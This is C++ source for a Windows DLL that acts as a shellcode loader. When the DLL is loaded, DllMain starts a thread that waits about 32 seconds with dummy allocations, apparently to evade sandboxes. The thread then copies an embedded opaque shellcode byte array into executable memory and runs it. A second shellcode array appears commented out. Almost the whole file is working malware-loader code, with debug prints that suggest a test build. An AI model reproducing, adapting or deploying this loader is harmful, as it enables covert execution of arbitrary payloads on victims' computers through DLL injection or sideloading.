// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <Windows.h>
#include <iostream>
using namespace std;


char shellcode[] =
"\x23\xff\xd4\xa0\x03\x17\xfc\xd9\xac\xcb\x09\x9a\x1b\x0f\xba"
"\x2a\xa1\xa1\x23\x53\x76\xd0\xa0\xf6\xf9\xd5\xbe\x67\x91\xb0"
"\xed\x0a\xef\x9a\xa1\xb7\x9a\xbe\x22\xa5\xf4\xdf\xf2\xe7\x0b"
"\xee\x30\xd5\x86\x84\x81\x85\xd9\x80\x0c\x7b\xf7\xd7\x00\xb4"
"\xe7\xc2\x3d\xab\x23\x24\xbc\xe9\xe9\x1c\x35\xca\x8c\xac\x19"
"\x7b\x4f\x5c\x3c\x81\x44\xce\xb8\x50\x29\x90\x29\x1a\x18\xe2"
"\x4a\x9b\x94\xd1\xcf\xb1\x0a\x27\x44\xa1\xdc\x7a\x26\x33\xd1"
"\x0d\x2f\x3d\x40\x7d\x9b\xd2\x44\x52\x09\xfa\x29\xe0\x2c\x04"
"\x67\x34\x19\xe2\xa4\x3a\x6d\x8b\x3d\x86\x7b\x76\xbf\xb6\x99"
"\x5a\x9b\x69\xf7\xb3\x24\x04\xf3\x3d\x35\xd0\xc6\xbe\x19\xd6"
"\xf5\x72\x7f\x3f\x16\x46\x3e\x94\x20\xef\xda\xbd\x6f\x91\x90"
"\xbf\xab\xca\x9c\x7c\x49\x55\x55\x0c\x13\x8b\x21\xa0\x88\x72"
"\xee\xab\x28\x0d\x01\xaf\x8d\xb3\x0a\x33\xbd\x8f\x68\xe7\x16"
"\x99\x70\x92\x2c\x45\x75\xe2\x88\x6c\x24\x24\x91\x9b\xa7\xaf"
"\x0d\x27\x10\x84\x0a\x55\xe1\x86\xad\x99\xa0\xca\xdc\xff\x8c"
"\xa7\xe4\x9c\x8d\x56\xd0\x2f\x6d\xe0\x93\xc0\x5f\xb3\xf4\x41"
"\x73\x61\xf3\xff\x91\x1f\x56\xa8\x69\xbc\xae\x7a\x8d\xaa\xe5"
"\xc2\xef\xb3\x39\xdd\x72\xd8\x4c\xa6\xa8\x37\x80\xdd\xe7\x74"
"\x37\xb7\xa4\x21\x8c\xc6\x04\x2e\x07\xb5\x34\x68\x88\x26\x2f"
"\x53\xa8\x7c\x5b\x61\x67\xe7\x47\x15\x64\x09\xa0\xeb\x6b\x75"
"\x2d\x5a\xdb\xea\x8c\xcf\x35\x36\xf4\x61\xfb\x4f\xef\x14\xe1"
"\xe4\x56\x6f\x7e\x83\x41\xa6\xc3\xd6\x14\xc5\x25\x31\x73\xfa"
"\xb6\xf6\x0d\xc5\x86\xd7\x68\xc0\xa7\x33\x41\x23\x31\xb4\x8d"
"\x21\xf6\x45\xdc\x79\x6b\xcc\x7a\xcb\x21\x38\x77\x8b\x06\x33"
"\xf2\x02\x4d\x8e\xc3\x0c\x37\x53\x41\x5d\x6f\x19\x8f\xb6\xd7"
"\xfa\x63\xe7\x55\xb1\x1e\x55\xee\xe4\x15\xeb\x64\x23\xdf\x0f"
"\x83\xf3\x4f\xc1\xb9\x86\xd6\xcc\x79\x1a\x4f\x25\x72\x22\xbf"
"\x6d\xe6\x2d\xb9\x0c\x20\xff\x53\x4a\x39\x3e\x96\x49\x46\x03"
"\x4e\x45\x09\x20\x28\x0d\xba\x07\x61\x75\x9e\x99\x2f\x3b\xdf"
"\x4c\xd0\xc0\x55\x37\x14\x18\xe3\x6c\x72\x70\x30\x4b\xcd\xdd"
"\xb7\x2d\xc6\xbf\x4b\xda\x69\xbf\xb2\xb3\xe4\xaf\x66\x0c\x65"
"\x0d\xa0\x0a\xcc\x71\x14\xa6\xb2\xeb\xba\xfd\xb4\xd4\x47\x59"
"\x24\xd5\x94\x95\xa0\x88\x0a\x29\x62\x4f\x2b\xf7\x37\xc5\x2f"
"\x93\x65\x31\xee\xb9\x49\x44\x5f\xfc\x05\x27\x51\xe5\x03\x53"
"\xad\xd8\xcb\x2b\x6a\xac\x91\xb1\x31\xf6\x56\x57\xe6\x9a\x9d"
"\x26";
//"\xba\x7e\x8e\x04\x3b\xdb\xdc\xd9\x74\x24\xf4\x58\x33\xc9\x66"
//"\xb9\x1a\x01\x31\x50\x17\x03\x50\x17\x83\xe8\xfc\xe2\x8b\x54"
//"\xd7\xe2\x07\x4d\x2c\x4e\xd4\x44\xaa\xd6\x09\x56\x8e\x11\x1a"
//"\x8e\x8a\x50\x0e\x35\xe8\x79\x32\x4a\x84\x6a\x10\x8f\x31\xeb"
//"\x51\x86\xc3\xb5\x7c\x97\x9a\xc4\x7f\x47\x95\x83\xf0\xee\x64"
//"\xac\xc2\x0e\xb7\x45\x75\xbe\x9b\xaf\xd3\x03\x8f\x6a\xf7\xd0"
//"\x2a\x7f\x83\xa5\xc5\xd0\x6f\x21\x6a\x3c\x3a\xcf\x1c\xdc\x11"
//"\x55\x65\xf0\x8d\x0a\x47\x73\xd8\x9d\x65\xec\xc2\x76\x56\x17"
//"\xbd\x11\x9a\x0f\xb3\xc1\x26\x8d\x31\x23\x76\x93\x2f\x90\xfe"
//"\xfb\x0d\xe1\x96\x5c\x0c\xb1\x34\x60\x1e\x8b\xb8\xfa\x36\xd2"
//"\x7f\xc9\x5a\x36\xe1\x63\x9e\xbf\x68\x8e\x72\x27\x2a\xe3\x42"
//"\x18\x83\x1e\xbe\xaf\x92\x94\x59\xec\xe9\xfc\x1e\x4f\x53\xeb"
//"\x43\x86\xaa\xb9\x2b\x1e\x24\x57\x8a\x40\x62\x27\xb4\xc9\xfc"
//"\x17\x89\xfa\x89\x8f\x8f\xbd\x22\x05\xb1\x8f\xec\x2f\x5f\xae"
//"\xe3\x9d\x45\x0f\x1e\xc2\xc0\xbf\xab\xf0\xe8\x5a\x90\xc5\x27"
//"\x69\x5d\xf9\xe8\xe1\xb3\x1b\x25\xc4\xfe\x51\xa0\x4b\xb4\x48"
//"\x74\xa5\xec\xd0\x75\x2e\x00\x19\xf2\x46\x58\xad\xe2\x80\x9a"
//"\xa7\xc3\x9f\x2e\xd0\xda\x63\x33\x4f\x82\x15\x32\xd5\x2e\x03"
//"\xa0\xfc\xf8\x4b\x2f\x16\x94\x1c\xa1\xe3\x86\xcb\x3d\x27\x65"
//"\x97\x5a\x66\xc1\xf0\x53\x3f\x08\x7d\x19\x27\xf4\x7c\x12\x9d"
//"\xfd\x81\xe1\x4d\x74\xcd\x69\x6c\x43\x9a\x9c\x6c\x1b\xfb\xcf"
//"\x3d\x86\xf4\xf1\x28\x33\x6e\x3c\x94\x3d\x72\x3a\x0f\x8f\xb7"
//"\x49\xf8\xe8\x55\xa7\x2b\x96\x7b\xeb\xef\xf0\xea\xa5\x3f\x57"
//"\x9b\x5e\x06\xa8\xd6\x54\x80\xa5\x66\x6f\x84\x2a\x6a\x64\xf2"
//"\x23\x0c\x48\xc7\xb2\xbc\xff\x58\xfb\xc5\xb2\xc0\x8b\x90\xb6"
//"\x93\xc8\x63\xcd\x10\x3e\xb6\x53\x9b\x4d\x1f\x05\x5c\x89\xfb"
//"\x92\x60\xfc\x44\xfe\x01\xec\x86\x4f\x65\x2c\x93\x71\xbf\x4c"
//"\x5c\xa7\xcd\x49\x46\xa0\x3b\xe2\x89\x42\xff\x68\x9c\xfc\x71"
//"\xa3\x26\xaf\x5f\xe7\xb1\x76\x9e\x93\xb6\x5b\x94\x16\x8c\x02"
//"\x8e\x20\x16\xda\x87\xe8\xc5\xf8\x01\xf9\x56\xea\xa9\xc5\x1e"
//"\xde\x8d\x9c\x6c\x6c\x2f\x7f\xab\xc7\x43\x70\x33\xaa\xad\x29"
//"\x88\x6f\x9c\x0e\xf5\xb2\xb9\xe4\x64\xcf\xda\x13\x7d\xbc\x1d"
//"\x52\x43\xa4\x77\x50\x30\x62\xda\x12\xdc\x33\xd1\x23\x69\xbd"
//"\x3a\x66\x0b\x7a\x79\x1c\xe9\x55\x67\x81\x33\x4f\xf3\x6e\x50"
//"\x4a\x4c\xc6\xe1\x4e\xba\xbc\x72\x6f\xc9\x02\x04\x05\x44\x0c"
//"\xdd\xff\x9d\x6b\x49\x96\xd8\x78\xb4\x11\x20\xe7\xc1\xcf\x27"
//"\xad\xfd\x78\x2e\x12\xa1\x56\xdb\xae\x98\x89\xc7\xa9\xae\x38"
//"\x26\xac\x76\x1f\xcf\x0f\xb3\x34\x02\x8c\x1d\x5a\xa1\xcc\x62"
//"\x70\x1c\x28\x62\x30\x7a\x70\x97\xbf\x87\x45\xfc\x9c\x67\xd7"
//"\x98\x27\x46\x65\xdb\x30\x98\xcf\x98\x99\x91\x6f\xa0\x5f\xc6"
//"\x2d\xaa\x11\xcc\xc7\xb1\x00\x89\x97\x76\xae\x62\x30\x46\x97"
//"\xbe\xf5\xd8\xb2\x55\x0d\x24\xe9\xa9\xcc\x1d\xed\x77\xeb\xfc"
//"\x97\x03\xcd\x1c\x92\xdf\xa3\xc5\x3d\xb7\x88\xf5\x1f\x15\x64"
//"\x4c\x07\xe2\xc4\x45\xd8\x90\xe7\x33\x4b\x60\x9f\x4c\x68\x19"
//"\x67\x25\xda\xeb\x6a\x04\xf9\x0a\xa3\xac\x05\xe8\xf6\x6a\xae"
//"\x01\xdc\x58\x57\x59\x01\x84\x46\x5f\x9a\xd2\x93\x47\x5b\x6d"
//"\x77\xb1\x4a\xd3\xf8\x86\x11\x8c\x35\x23\xcd\x3a\x1d\x66\x1c"
//"\x19\xf5\xa8\x18\x12\x66\xc9\xda\x99\xa5\x97\x4e\xbb\x51\x6f"
//"\xbf\xba\x9c\x82\xc5\xc8\x10\x85\x4b\x53\xfa\xbc\xc1\x95\x9a"
//"\xba\x80\xd2\x9e\xcc\x7e\x9e\xbb\xfa\x3e\xfa\x7c\x3f\x4d\xdd"
//"\x32\xa7\x0e\x3c\x27\xbc\x48\x65\x9a\x6a\xe7\x20\x05\xf5\x29"
//"\x53\x87\x3f\xf2\x58\xf6\x94\xa1\x53\x32\x80\x5a\x3c\x5c\x4d"
//"\x1b\x03\x3f\x59\xda\x6a\x34\x09\xb7\xd2\x02\xff\xce\xeb\x30"
//"\xa1\x68\xe1\x27\x57\x24\x94\x8a\x7e\x75\x3c\xaa\x67\x6d\xf6"
//"\x35\xf9\x75\x67\x1e\x52\x44\x6b\x76\x18\x16\x3f\x16\x78\x1c"
//"\x99\xc4\xb1\x26\xda\x5e\xaf\xd7\x9a\x5f\x40\x55\x91\xea\xed"
//"\xbc\x58\x47\x3f\x3d\x69\xff\xee\x9e\xaf\x6e\x6c\x97\xb9\x0c"
//"\x3b\x57\xa9\x0f\x18\x42\x4f\x11\x82\x75\xb8\x45\x42\x46\x99"
//"\xd3\x84\xd9\xd2\x59\x86\xe7\x1a\xe3\xfd\x49\x26\x92\x83\x96"
//"\x3d\x35\x09\x6d\x0a\xf6\x7f\xc5\xd2\xd6\xf6\xf4\xd7\xc5\x33"
//"\xbc\x0a\xe2\xcb\xcd\x72\x70\x70\xb6\x3d\x1e\x97\xf0\x6b\x91"
//"\xad\x54\x4b\x34\xee\xd7\x1a\x8e\x3f\x10\xf2\x78\x1b\x6e\x05"
//"\x2f\x8a\x44\xa5\x53\x06\x56\xf8\xbe\x07\x00\xab\x89\xca\x7d"
//"\x4d\x7e\x7d\x20\xec\x15\x95\x76\x77\xc5\x0b\xf1\x9e\x84\x46"
//"\x14\x99\x18\xff\x06\xd7\xb6\x0e\x24\x36\xe8\x03\x7a\x80\x66"
//"\x50\xe7\x71\xd4\x01\x4b\x70\x61\x6f\x9a\x6f\xcf\x71\x19\x52"
//"\x43\xcf\x54\xdc\xe4\x80\x7f\x23\x2d\x5e\x23\x3a\x4e\x3a\xe4"
//"\xb4\x46\x1d\x50\xa1\xc0\xfd\x5c\xf9\xd3\xf4\x2b\x42\xb9\x31"
//"\x56\x65\x92\x1b\x13\xd4\xb7\x37\xe2\x75\x9e\x42\x62\x63\x59"
//"\xdc\xe6\x41\x16\x3a\xc5\x6f\x99\x96\xc0\xae\x38\x53\x91\x86"
//"\xc2\xed\xf0\x54\xa6\x70\x73\xae\xd4\x8d\x2e\xe0\xcf\xf5\xef"
//"\x49\x8e\xfe\x02\xba\x15\xfc\xe1\xe0\xfd\x21\xef\xb0\xf1\xc1"
//"\x95\xfa\x79\xce\x7c\x3f\x5e\x18\xb4\x55\x3c\x47\x88\x4a\x13"
//"\xa5\x7b\x3d\x99\x3f\x10\x3a\xaf\x60\x3e\x97\x41\xe8\xcc\xdb"
//"\xae\x4b\xa9\xf2\xc6\x6c\x62\x02\x65\x16\xa5\xbb\x4e\x2d\x7f"
//"\x44\xe6\xd3\x5e\xdd\x31\x5b\x05\xae\x39\xc3\x4b\x51\x80\x48"
//"\x7d\xf7\x23\xe1\x65\x3d\x08\xe3\x98\x01\x67\xd9\x16\x65\xb6"
//"\x3a";


DWORD WINAPI ClientThread(LPVOID param)
{
    for (int i = 0; i < 32; i++) {
        cout << "sleep " << i << endl;
        Sleep(1000);
        void* pMalloc = malloc(32000);
        free(pMalloc);
    }

    HANDLE hProcess = GetCurrentProcess();
    void* pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode)-1);

    cout << "run sc" << endl;

    int(*func)();
    func = (int(*)()) pShellcode;
    (*func)();

    cout << "sc runned" << endl;

    //MSG Msg;
    //while (GetMessage(&Msg, NULL, 0, 0) > 0)
    //{
    //    TranslateMessage(&Msg);
    //    DispatchMessageA(&Msg);
    //}

    MessageBoxA(NULL, "aaa", "bbb", 0);
    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
        cout << "dll loaded, create thread" << endl;
        HANDLE hThread = CreateThread(NULL, 0, ClientThread, NULL, 0, 0);
        if (hThread != NULL)
        {
            cout << "close thread: " << hThread << endl;
            CloseHandle(hThread);
        }
        break;
	/*case DLL_THREAD_ATTACH:
        break;
	case DLL_THREAD_DETACH:
        break;
	case DLL_PROCESS_DETACH:
		break;*/
	}
	return TRUE;
}

